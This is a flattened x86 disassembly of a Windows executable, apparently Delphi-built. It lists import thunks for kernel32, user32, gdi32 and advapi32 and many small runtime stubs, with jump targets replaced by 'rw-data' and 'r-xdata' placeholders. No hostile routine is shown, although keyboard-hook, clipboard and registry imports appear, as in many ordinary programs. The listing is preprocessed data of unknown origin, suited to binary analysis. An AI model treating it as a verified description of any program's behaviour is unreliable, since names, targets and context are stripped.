pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a4f
jmp sub_403878
sub_405a56
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b1a
jmp sub_403878
sub_405b21
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405b72
jmp sub_403878
sub_405b79
pop ebp
retn
sub_405c50
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405c70
push eax
push 0x40
call LocalAlloc
retn
sub_405c7c
mov eax 0x10
retn
sub_405d08
mov eax rw-data
call sub_405518
retn
sub_405d7d
jmp sub_403878
sub_405d84
pop ebp
retn
sub_405d88
sub [ rw-data ] 0x1
retn
sub_405d90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405dac
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405df5
jmp sub_403878
sub_405dfc
pop ebp
retn
sub_405e00
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetExitCodeThread
jmp [ __import_lookup_table_6(kernel32:GetExitCodeThread) ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFileSize
jmp [ __import_lookup_table_6(kernel32:GetFileSize) ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ __import_lookup_table_6(kernel32:GetTempPathA) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
OutputDebugStringA
jmp [ __import_lookup_table_6(kernel32:OutputDebugStringA) ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_40611c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
SuspendThread
jmp [ __import_lookup_table_6(kernel32:SuspendThread) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ EndPage@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetTextMetricsA
jmp [ __import_lookup_table_8(gdi32:GetTextMetricsA) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
ScaleViewportExtEx
jmp [ ScaleViewportExtEx@IAT ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ BringWindowToTop@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetDlgItem
jmp [ __import_lookup_table_9(user32:GetDlgItem) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ __import_lookup_table_9(user32:TranslateMessage) ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_4068f0
call GetTickCount
retn
sub_4068f8
xor eax eax
retn
sub_4068fc
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_40690c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406928
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_40693c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406974
call sub_4068e4
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406b51
jmp sub_403878
sub_406b58
pop ebp
retn
sub_406b5c
sub [ rw-data ] 0x1
retn
sub_406b89
jmp sub_403878
sub_406b90
pop ebp
retn
sub_406b94
sub [ rw-data ] 0x1
retn
sub_406ea9
jmp sub_403878
sub_406eb0
pop ebp
retn
sub_406eb4
sub [ rw-data ] 0x1
retn
sub_407991
add eax 0xffffffd4
jmp sub_40d09c
sub_4079a3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40566c
sub_4079ad
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405680
sub_407a84
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
pop ebx
retn
sub_407d5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407d24
test eax eax
sete al
pop esi
pop ebx
retn
sub_4082ba
jmp sub_403878
sub_4082c1
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4082c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408254
pop esi
pop ebx
retn
sub_408358
call sub_408334
retn
sub_4083f0
push eax
call CloseHandle
retn
sub_408460
push ebx
mov ebx eax
mov eax ebx
call sub_4083f8
inc eax
setne al
pop ebx
retn
sub_408638
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_40864c
push esi
mov esi eax
xchg edx eax
call sub_4028e0
mov eax esi
pop esi
retn
sub_408838
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040f0
pop esi
pop ebx
retn
sub_40884c
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026e4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408860
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408898
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402704
sub_408900
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402840
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408924
push ebx
mov ebx eax
mov eax ebx
call sub_403ef8
pop ebx
retn
sub_408c87
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403ef8
pop eax
pop ebx
retn
sub_408f3f
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40909a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4093f7
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4093f7
sub_4094b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043b8
mov edx esi
xor ecx ecx
call sub_409340
pop esi
pop ebx
retn
sub_409528
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043b8
mov edx esi
mov cl 0x1
call sub_409340
pop esi
pop ebx
retn
sub_409c62
jmp sub_403878
sub_409c69
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409d5a
jmp sub_403878
sub_409d61
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a505
jmp sub_403878
sub_40a50c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a594
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a538
pop ebp
retn 0x8
sub_40a6d9
jmp sub_403878
sub_40a6e0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ab83
jmp sub_403878
sub_40ab8a
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b06f
jmp sub_403878
sub_40b076
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b111
mov [ eax ] edx
push sub_40b128
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40b121
jmp sub_403878
sub_40b128
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b1cb
jmp sub_403878
sub_40b1d2
pop esi
pop ecx
pop ebp
retn
sub_40b3ae
jmp sub_403878
sub_40b3b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b40c
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b6fe
jmp sub_403878
sub_40b7cc
jmp sub_403878
sub_40b7f4
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4030d8
sub_40b990
jmp sub_403878
sub_40b997
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9a0
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4038b0
sub_40b9ad
retn
sub_40b9b0
push ebp
mov ebp esp
call sub_40b8f4
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b9a0
pop ebp
retn 0x4
sub_40b9cc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
retn
sub_40ba64
push ebx
mov ebx eax
mov eax ebx
call sub_40b9e4
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bc37
jmp sub_403878
sub_40bc3e
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd03
jmp sub_403878
sub_40bd0a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd14
call sub_40b5a0
mov eax 0x1
call sub_403e5c
sub_40be98
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bf71
jmp sub_403878
sub_40bf8e
jmp sub_403878
sub_40bf95
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c040
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bfa4
mov ecx eax
sub_40c22c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c24c
push eax
call CharNextA
retn
sub_40c5b4
jmp sub_403878
sub_40c5bb
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c624
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40ca7b
jmp sub_403878
sub_40ca82
pop ebx
mov esp ebp
pop ebp
retn
sub_40cc4b
jmp sub_403878
sub_40cc52
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40ccf4
jmp sub_403878
sub_40ccfb
pop ebx
mov esp ebp
pop ebp
retn
sub_40cd00
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cc64
sub_40cd10
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cd2c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402704
pop ebx
retn
sub_40cdb4
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cdc0
xchg [ eax ] edx
mov eax edx
retn
sub_40ce20
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ceb0
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cfc8
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cff0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d26b
jmp sub_403878
sub_40d272
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d2e0
jmp sub_403878
sub_40d2e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d305
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d2fe
jmp sub_403878
sub_40d305
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d7c8
jmp sub_403878
sub_40d7cf
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d848
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d8ae
jmp sub_403878
sub_40d8b5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d91a
jmp sub_403878
sub_40d921
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d986
jmp sub_403878
sub_40d98d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d9f2
jmp sub_403878
sub_40d9f9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da5e
jmp sub_403878
sub_40da65
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dadd
jmp sub_403878
sub_40dae4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40db50
jmp sub_403878
sub_40db57
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dbc0
jmp sub_403878
sub_40dbc7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dc34
jmp sub_403878
sub_40dc3b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40dfc1
jmp sub_403878
sub_40dfc8
pop ebp
retn
sub_40dfcc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dc90
sub_40dfdd
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e5fe
jmp sub_403878
sub_40e605
pop ecx
pop ebp
retn
sub_40e697
jmp sub_403878
sub_40e69e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e6ee
jmp sub_403878
sub_40e6f5
pop ecx
pop ebp
retn
sub_40e787
jmp sub_403878
sub_40e78e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e7de
jmp sub_403878
sub_40e7e5
pop ecx
pop ebp
retn
sub_40ea2d
jmp sub_403878
sub_40ea34
pop ebx
mov esp ebp
pop ebp
retn
sub_40eac6
jmp sub_403878
sub_40eacd
pop ecx
pop ebp
retn
sub_40ead0
push ebx
mov ebx eax
mov eax ebx
call sub_40ed68
mov [ ebx ] 0x1
pop ebx
retn
sub_40ed68
test [ eax ] 0xbfe8
jne r-xdata
call sub_40ecec
retn
mov [ eax ] 0x0
retn
sub_40ed7c
push eax
call sub_40ed68
pop eax
retn
sub_40efdc
call sub_40f090
retn
sub_40f1fa
jmp sub_403878
sub_40f201
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f2a5
jmp sub_403878
sub_40f2ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2ce
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4045f0
retn
sub_40f2c7
jmp sub_403878
sub_40f2ce
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f32a
jmp sub_403878
sub_40f331
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3ad
jmp sub_403878
sub_40f8f3
jmp sub_403878
sub_40f8fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f98d
jmp sub_403878
sub_40f994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9b1
lea eax [ ebp - 0x14 ]
call sub_4045d8
retn
sub_40f9aa
jmp sub_403878
sub_40f9b1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa0e
jmp sub_403878
sub_40fa15
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fab7
jmp sub_403878
